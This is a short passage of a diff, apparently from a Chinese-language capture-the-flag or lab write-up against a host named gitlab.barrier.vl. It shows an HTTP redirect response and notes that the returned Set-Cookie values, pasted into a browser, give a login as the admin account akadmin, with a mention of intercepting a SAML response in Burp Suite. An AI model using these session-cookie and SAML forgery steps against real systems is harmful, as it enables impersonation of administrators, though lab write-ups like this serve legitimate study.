+X-Ua-Compatible: IE=edge
+X-Xss-Protection: 1; mode=block
+Strict-Transport-Security: max-age=63072000
+Referrer-Policy: strict-origin-when-cross-origin
+
+<html><body>You are being <a href="https://gitlab.barrier.vl/">redirected</a>.</body></html>
+```
+</details>
+
 #### 发送之后，我们应该能看到两个“Set-Cookie”，可以直接复制到浏览器中，然后刷新网页，我们就会以 akadmin 的身份登录了。
+```
+%3D%3D 要变成 ==（URL解码）
+```
+
+
 ____________________________________________________
 ### 其他
 #### Burpsuite拦截 SAML XML ，拦截不到GET请求 SAMLResponse
